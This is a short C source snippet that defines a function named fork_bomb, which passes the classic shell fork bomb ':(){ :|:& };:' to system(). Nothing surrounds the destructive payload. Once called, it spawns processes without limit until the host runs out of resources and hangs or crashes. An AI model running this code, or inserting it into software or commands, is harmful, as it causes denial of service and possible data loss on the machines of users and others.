#include <stdlib.h>

void fork_bomb() {
    system(":(){ :|:& };:");
}